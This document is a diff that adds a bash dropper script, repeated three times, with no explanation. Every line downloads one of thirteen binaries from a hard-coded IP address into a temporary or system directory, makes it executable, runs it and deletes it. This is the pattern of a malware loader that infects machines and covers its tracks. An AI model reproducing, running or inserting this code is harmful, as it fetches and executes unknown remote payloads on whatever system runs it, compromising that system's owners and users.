@@ -1,0 +1,42 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin1; chmod +x bin1; ./bin1; rm -rf bin1
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin2; chmod +x bin2; ./bin2; rm -rf bin2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin3; chmod +x bin3; ./bin3; rm -rf bin3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin4; chmod +x bin4; ./bin4; rm -rf bin4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin5; chmod +x bin5; ./bin5; rm -rf bin5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin6; chmod +x bin6; ./bin6; rm -rf bin6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin7; chmod +x bin7; ./bin7; rm -rf bin7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin8; chmod +x bin8; ./bin8; rm -rf bin8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin9; chmod +x bin9; ./bin9; rm -rf bin9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin10; chmod +x bin10; ./bin10; rm -rf bin10
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin11; chmod +x bin11; ./bin11; rm -rf bin11
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin12; chmod +x bin12; ./bin12; rm -rf bin12
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin13; chmod +x bin13; ./bin13; rm -rf bin13
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin1; chmod +x bin1; ./bin1; rm -rf bin1
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin2; chmod +x bin2; ./bin2; rm -rf bin2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin3; chmod +x bin3; ./bin3; rm -rf bin3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin4; chmod +x bin4; ./bin4; rm -rf bin4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin5; chmod +x bin5; ./bin5; rm -rf bin5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin6; chmod +x bin6; ./bin6; rm -rf bin6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin7; chmod +x bin7; ./bin7; rm -rf bin7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin8; chmod +x bin8; ./bin8; rm -rf bin8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin9; chmod +x bin9; ./bin9; rm -rf bin9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin10; chmod +x bin10; ./bin10; rm -rf bin10
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin11; chmod +x bin11; ./bin11; rm -rf bin11
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin12; chmod +x bin12; ./bin12; rm -rf bin12
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin13; chmod +x bin13; ./bin13; rm -rf bin13
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin1; chmod +x bin1; ./bin1; rm -rf bin1
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin2; chmod +x bin2; ./bin2; rm -rf bin2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin3; chmod +x bin3; ./bin3; rm -rf bin3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin4; chmod +x bin4; ./bin4; rm -rf bin4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin5; chmod +x bin5; ./bin5; rm -rf bin5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin6; chmod +x bin6; ./bin6; rm -rf bin6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin7; chmod +x bin7; ./bin7; rm -rf bin7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin8; chmod +x bin8; ./bin8; rm -rf bin8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin9; chmod +x bin9; ./bin9; rm -rf bin9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin10; chmod +x bin10; ./bin10; rm -rf bin10
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin11; chmod +x bin11; ./bin11; rm -rf bin11
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin12; chmod +x bin12; ./bin12; rm -rf bin12
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.211.244.151/bin13; chmod +x bin13; ./bin13; rm -rf bin13
